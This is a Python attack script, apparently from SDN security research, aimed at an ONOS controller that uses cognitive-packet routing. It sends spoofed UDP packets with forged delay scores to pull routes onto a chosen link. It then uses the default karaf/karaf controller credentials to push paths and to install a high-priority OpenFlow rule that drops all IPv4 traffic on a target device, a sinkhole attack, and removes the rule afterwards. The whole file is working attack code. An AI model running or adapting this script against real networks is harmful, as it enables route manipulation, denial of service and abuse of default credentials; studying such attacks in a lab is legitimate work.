from scapy.all import sendp, Ether, IP, UDP
import argparse
import requests as rq
from requests.auth import HTTPBasicAuth
from collections import Counter
import time
import json

'''
Returned values: 
2 -> problem with parsing CLI arguments
3 -> problem accessing the controller
'''

def sendCognitivePacketOut(ipDestination, ipSource, payload, port):
    packet = Ether(dst="FF:FF:FF:FF:FF")/IP(dst=ipDestination, src=ipSource, proto=17)/UDP(dport=port, sport=port)/payload
    sendp(packet,verbose=0)

# Config section

parser = argparse.ArgumentParser()

parser.add_argument("ctrlIP", help="This is the IP of the controller.")

parser.add_argument("link",help="Link that will receive low delay score. Other links will receive high delay scores in spoofed packets."
                                "Notation- srcIP-dstIP")
parser.add_argument("deviceID", help="ID of the device on which the sinkhole will be installed.")

parser.add_argument("--sleep",help="Sleep between two chunks of spoofed cognitive packets in seconds. Default is 0", default=0, type=int)

parser.add_argument("--maxiter",help="Number of times spoofer will send all of the "
                                     "possible spoofed packets. Default is 100.",default=100,type=int)

parser.add_argument("--dont-spoof-on",help="Links that will not be affected by spoofing. Cannot be used with --spoofOn "
                                         "parameter. Use notation srcIP-dstIP srcIP2-dstIP2",nargs="*",default=None)

parser.add_argument("--spoof-on",help="Provide links that will be spoofed. Cannot be used with --dontSpoofOn parameter"
                                     ". Use notation srcIP-dstIP srcIP2-dstIP2",nargs="*",default=None)

args = parser.parse_args()
if args.spoof_on!=None and args.dont_spoof_on!=None:
    print("Both parameters --spoofOn and --dontSpoofOn are mutually exclusive")
    exit(2)
url = "http://{}:8181/onos/rnn/SRE/cnm".format(args.ctrlIP)
print("Starting with gathering info on daemons in the network. Fetching data from {}".format(url))
response = rq.get(url, auth=HTTPBasicAuth("karaf","karaf"))
daemons = []
if response.status_code == 200:
    print("Fetched the CNM from the controller")
    for obj in response.json()["cnm"]["administration"]["parameters"]:
        try:
            daemons = obj["daemons"]
            break
        except:
            daemons=None
    if daemons == None:
        print("Unable to fetch daemons.")
        exit(3)
else:
    print("Unable to fetch data from the controller. \nStatus code: {}. \n\nReceived body: {}".format(response.status_code,response.text))
    exit(3)
print("Fetched the deamons list from the controller")
daemons = daemons.replace("[{ ","").replace(" }]","").replace(" ","")
daemons = daemons.split("},{")
ipDaemons = []
for d in daemons:
    ipDaemons.append(d.split(",")[1])
print("Fetched IPs of the daemons: ",ipDaemons)
print("Checking if provided link {} is among the daemons IPs".format(args.link))
srcIP = None
dstIP = None
try:
    srcIP = args.link.split("-")[0]
    dstIP = args.link.split("-")[1]
except:
    print("Provided link is in incorrect format - should be in: srcIP-dstIP was in {}".format(args.link))
    exit(2)
if srcIP in ipDaemons and dstIP in ipDaemons:
    print("Provided link is correct.")
else:
    print("Provided link cannot be found in the daemons ip list")
    exit(2)
spoofOn = []
dontSpoofOn = []

if args.spoof_on != None:
    for item in args.spoof_on:
        spoofOn.append((item.split("-")[0],item.split("-")[1]))
if args.dont_spoof_on:
    for item in args.dont_spoof_on:
        dontSpoofOn.append((item.split("-")[0],item.split("-")[1]))
print("Dont Spoof on list : ",dontSpoofOn)
print("Spoof On list: ",spoofOn)
### END CONFIG SECTION

print("Starting spoofing packets")
for i in range(args.maxiter):
    counter = Counter()
    for src in ipDaemons:
        for dst in ipDaemons:
            if src != dst:
                delay = 500
                send = True
                if args.dont_spoof_on != None:
                    send = True
                    for item in dontSpoofOn:
                        if (item[0] == src and item[1]==dst) or (item[0]==dst and item[1]==src):
                            send = False
                            break
                if args.spoof_on != None:
                    send = False
                    for item in spoofOn:
                        if (item[0] == src and item[1]==dst) or (item[0]==dst and item[1]==src):
                            send = True
                            break
                if (src == srcIP and dst == dstIP) or (src == dstIP and dst == srcIP):
                    delay = 1
                    send = True
                if send:
                    counter.update(["delay="+str(delay)])
                    payload = "{},{},0|{},1|{},{}|".format(dst,src,src,dst,delay)
                    sendCognitivePacketOut(dst,src,payload,5015)
    print("Sent packets with delay ",counter.most_common()," Percent ready ",(i/args.maxiter)*100,"%")
    time.sleep(args.sleep)
file = open("paths.json","r")
jstring = ""

for line in file:
  jstring+=line.replace("\n","")
jconfig = json.loads(jstring)
pathurl = "http://{}:8181/onos/rnn/SRE/path".format(args.ctrlIP)
try:
    for path in jconfig["paths"]:
        x = rq.post(pathurl,json=path,headers={'Content-Type': 'application/json','Accept': 'application/json'},auth=("karaf","karaf"))
except:
    c = 0
print("Attack succeeded.")
print("Installing sinkhole on device ",args.deviceID)
urlSinkhole = "http://{}:8181/onos/v1/flows?appId=sinkhole.org".format(args.ctrlIP)
crit = []
crit.append({"type":"ETH_TYPE","ethType":"0x800"})
selector = {"criteria":crit}
instr = {"instructions":[{"type":"NOACTION"}]}
flow = [{"priority":55000,"timeout":10000,"isPermanent":True,"deviceId":args.deviceID,"treatment":instr,"selector":selector}]
#print("To {} sending flow \n\n {}".format(args.deviceID,flow))
head = {'Content-Type': 'application/json','Accept': 'application/json'}
result = {"flows": flow}
x = rq.post(urlSinkhole, json=result, headers=head, auth=("karaf", "karaf"))

if x.status_code == 200:
    print("Successfully installed the OpenFlow rule for sinkhole attack.")
else:
    print("Problem installing OF rule for the sinkhole attack. Status code", x.status_code, " , response body: ",x.text)
    exit(3)



print("To delete that sinkhole OF rule press enter")

c = input()

flowId = x.json()["flows"][0]["flowId"]
print("Deleting using the flow id ",flowId)
urlDelete = "http://{}:8181/onos/v1/flows/{}/{}".format(args.ctrlIP,args.deviceID,flowId)
deleteResponse = rq.delete(urlDelete,auth=("karaf","karaf"))
if deleteResponse.status_code == 204:
    print("Flow with id {} was deleted successfully with response: OK".format(flowId))
else:
    print("Flow with id {} was NOT deleted successfully. Reason: {}".format(flowId,deleteResponse.text))
urlDelete = "http://{}:8181/onos/v1/flows".format(args.ctrlIP)
deleteResponse = rq.get(urlDelete,auth=("karaf","karaf"))
print("Cleaning up...")
if deleteResponse.status_code!=200:
    print("Unable to receive flows from the controller. Reason ",deleteResponse.text)
    exit(3)
for flow in deleteResponse.json()["flows"]:
    if flow["priority"] == 59999:
        device = flow["deviceId"]
        flowId = flow["id"]
        urlDelete = "http://{}:8181/onos/v1/flows/{}/{}".format(args.ctrlIP, device, flowId)
        deleteResponse = rq.delete(urlDelete, auth=("karaf", "karaf"))
print("Cleanup ready")